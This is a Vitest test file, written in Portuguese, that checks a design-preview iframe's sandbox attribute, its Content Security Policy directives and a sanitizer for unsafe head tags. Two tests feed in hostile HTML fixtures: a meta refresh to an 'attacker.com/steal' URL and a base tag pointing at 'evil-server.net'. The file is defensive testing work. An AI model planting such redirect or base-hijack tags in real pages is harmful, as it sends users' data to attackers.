import { describe, expect, it } from "vitest";

import { DESIGN_CSP, DESIGN_SANDBOX, buildSrcdoc, stripUnsafeHead } from "../srcdoc";

describe("Testes de Segurança do Sandbox de Design (CSP e Iframe Isolation)", () => {
  describe("Isolamento de Origem do Iframe (Sandbox)", () => {
    it("o sandbox padrão deve conter allow-scripts mas NUNCA allow-same-origin", () => {
      expect(DESIGN_SANDBOX).toBe("allow-scripts");
      expect(DESIGN_SANDBOX).not.toContain("allow-same-origin");
    });
  });

  describe("Validação de Diretivas CSP (Content Security Policy)", () => {
    it("CSP padrão atende aos requisitos de corte de rede e isolamento", () => {
      expect(DESIGN_CSP).toContain("default-src 'none'");
      expect(DESIGN_CSP).toContain("img-src data:");
      expect(DESIGN_CSP).toContain("form-action 'none'");
    });

    it("CSP da prancheta: só as bibliotecas e fontes permitidas; nenhuma outra origem", () => {
      const policy = Object.fromEntries(DESIGN_CSP.split(";").map((d) => d.trim().split(/\s+/)).map(([name, ...sources]) => [name, sources]));
      expect(policy["script-src"]).toEqual(["'unsafe-inline'", "https://cdnjs.cloudflare.com", "https://cdn.jsdelivr.net/npm/", "https://unpkg.com", "https://cdn.tailwindcss.com", "https://code.jquery.com"]);
      expect(policy["style-src"]).toEqual(["'unsafe-inline'", "https://fonts.googleapis.com"]);
      expect(policy["font-src"]).toEqual(["https://fonts.gstatic.com"]);
      expect(policy["img-src"]).toEqual(["data:", "blob:"]);
      expect(policy["connect-src"]).toEqual(["'none'"]);
      expect(policy["default-src"]).toEqual(["'none'"]);
      expect(policy["form-action"]).toEqual(["'none'"]);
      expect(policy["base-uri"]).toEqual(["'none'"]);
      expect(Object.keys(policy).sort()).toEqual(["base-uri", "connect-src", "default-src", "font-src", "form-action", "img-src", "script-src", "style-src"]);
    });

    it("o srcdoc embute a CSP do módulo e corta meta/base hostis", () => {
      const doc = buildSrcdoc(`<meta http-equiv="refresh" content="0;url=https://attacker.com/steal"><base href="https://evil-server.net/"><div>ok</div>`);
      expect(doc).toContain(`content="${DESIGN_CSP}"`);
      expect(doc).not.toContain("attacker.com");
      expect(doc).not.toContain("evil-server.net");
      expect(doc).toContain("<div>ok</div>");
    });
  });

  describe("Higienização contra Bypasses via <meta> e <base>", () => {
    it("remove meta http-equiv e tags <base>", () => {
      const sanitized = stripUnsafeHead(`
        <meta http-equiv="refresh" content="0;url=https://attacker.com/steal">
        <base href="https://evil-server.net/">
        <div>Conteúdo Legítimo</div>
      `);
      expect(sanitized).not.toContain("http-equiv");
      expect(sanitized).not.toContain("<base");
      expect(sanitized).toContain("<div>Conteúdo Legítimo</div>");
    });
  });
});
